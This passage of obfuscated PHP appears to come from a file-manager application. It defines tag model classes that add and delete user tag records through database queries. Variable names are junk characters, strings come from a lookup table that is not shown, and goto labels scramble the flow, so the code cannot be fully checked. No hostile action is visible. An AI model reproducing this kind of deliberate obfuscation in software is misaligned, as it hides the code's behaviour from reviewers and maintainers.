$–½ç˜Î¯) { $ˆ“ı‚ =& $_SERVER[ˆûùúÊ¯]; if (!$this->getByTagID($¿¿äÀ¥Ô, $–½ç˜Î¯)) { return !1; } $óáÜğÇ = array($ˆ“ı‚[1695] => 0, $ˆ“ı‚[533] => $–½ç˜Î¯, $ˆ“ı‚[472] => $ˆ“ı‚[2015] . $¿¿äÀ¥Ô); return $this->where($óáÜğÇ)->delete(); } protected function removeBySource($›´§óÕá, $ÕØÙ”ª) { $Éı³ùƒó =& $_SERVER[ˆûùúÊ¯]; if (!$›´§óÕá || !$ÕØÙ”ª) { return !1; } if (is_array($ÕØÙ”ª)) { $ÕØÙ”ª = array($Éı³ùƒó[7], $ÕØÙ”ª); } $°Ôß™ì© = array($Éı³ùƒó[1695] => 0, $Éı³ùƒó[471] => $ÕØÙ”ª, $Éı³ùƒó[533] => array($Éı³ùƒó[1075], 0), $Éı³ùƒó[472] => $Éı³ùƒó[2015] . $›´§óÕá); return $this->where($°Ôß™ì©)->delete(); } } goto dæ»ùŠèšŠ; Cì”ğ…ºÓ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($”ïŸ—Ÿ¸) { $¡¼·à´Ô =& $_SERVER[ˆûùúÊ¯]; return array($¡¼·à´Ô[2007] => array($¡¼·à´Ô[2397] . USER_ID, $¡¼·à´Ô[2008])); } protected function listData() { $Ü¦İ–Š =& $_SERVER[ˆûùúÊ¯]; $³ÉÊ¸ºÁ = array($Ü¦İ–Š[1695] => USER_ID, $Ü¦İ–Š[533] => array($Ü¦İ–Š[2011], 0)); $¥æ†ê = $Ü¦İ–Š[2398]; $çÇº¾ = $this->field($¥æ†ê)->where($³ÉÊ¸ºÁ)->order($Ü¦İ–Š[2014])->select(); return $çÇº¾ ? $çÇº¾ : array(); } protected function addToTag($çá¥à‰†, $ùïõ†‘ä) { $¢€³¢Œƒ =& $_SERVER[ˆûùúÊ¯]; if (!Model($¢€³¢Œƒ[2156])->listData($ùïõ†‘ä)) { return !1; } if (is_numeric($çá¥à‰†)) { $ãŞ”Ö’Ú = Model($¢€³¢Œƒ[885])->pathInfo($çá¥à‰†); if (!$ãŞ”Ö’Ú) { return !1; } } else { $ãŞ”Ö’Ú = IO::infoSimple($çá¥à‰†); if (!$ãŞ”Ö’Ú) { return !1; } $ï¢œ®¦ = $ãŞ”Ö’Ú[$¢€³¢Œƒ[42]]; $úíá€ôµ = $ãŞ”Ö’Ú[$¢€³¢Œƒ[43]]; if (isset($ãŞ”Ö’Ú[$¢€³¢Œƒ[461]])) { $úíá€ôµ = $ãŞ”Ö’Ú[$¢€³¢Œƒ[461]] == $¢€³¢Œƒ[98] ? $¢€³¢Œƒ[85] : $¢€³¢Œƒ[223]; } } $Ú³ÓÑâ = array($¢€³¢Œƒ[1695] => USER_ID, $¢€³¢Œƒ[533] => $ùïõ†‘ä, $¢€³¢Œƒ[471] => $çá¥à‰†, $¢€³¢Œƒ[472] => $úíá€ôµ ? $úíá€ôµ : $¢€³¢Œƒ[466], $¢€³¢Œƒ[470] => $ï¢œ®¦ ? $ï¢œ®¦ : $¢€³¢Œƒ[12], $¢€³¢Œƒ[1900] => 0); if ($this->where($Ú³ÓÑâ)->find()) { return !1; } return $this->add($Ú³ÓÑâ); } protected function removeFromTag($£áŒ¹, $ëû‰œ¯É) { $ØÙ¾õÈû =& $_SERVER[ˆûùúÊ¯]; if (!Model($ØÙ¾õÈû[2156])->listData($ëû‰œ¯É)) { return !1; } if (is_array($£áŒ¹)) { $£áŒ¹ = array($ØÙ¾õÈû[7], $£áŒ¹); } $ƒ¹çŒ”² = array($ØÙ¾õÈû[1695] => USER_ID, $ØÙ¾õÈû[533] => $ëû‰œ¯É, $ØÙ¾õÈû[471] => $£áŒ¹); return $this->where($ƒ¹çŒ”²)->delete(); } protected function removeByTag($à„®ñŒ†) { $‚õüªÎ =& $_SERVER[ˆûùúÊ¯]; if (!$à„®ñŒ†) { return !1; } $µ£ÁäÓ = array($‚õüªÎ[1695] => USER_ID, $‚õüªÎ[533] => $à„®ñŒ†); return $this->where($µ£ÁäÓ)->delete(); } protected function removeBySource($¹½¢ªñæ) { $‚İº’Õ‡ =& $_SERVER[ˆûùúÊ¯]; if (is_array($¹½¢ªñæ)) { $¹½¢ªñæ = array($‚İº’Õ‡[7], $¹½¢ªñæ); } $´²‘ÂÖ¸ = array($‚İº’Õ‡[1695] => USER_ID, $‚İº’Õ‡[533] => array($‚İº’Õ‡[1075], 0), $‚İº’Õ‡[471] => $¹½¢ªñæ); return $this->where($´²‘ÂÖ¸)->delete(); } }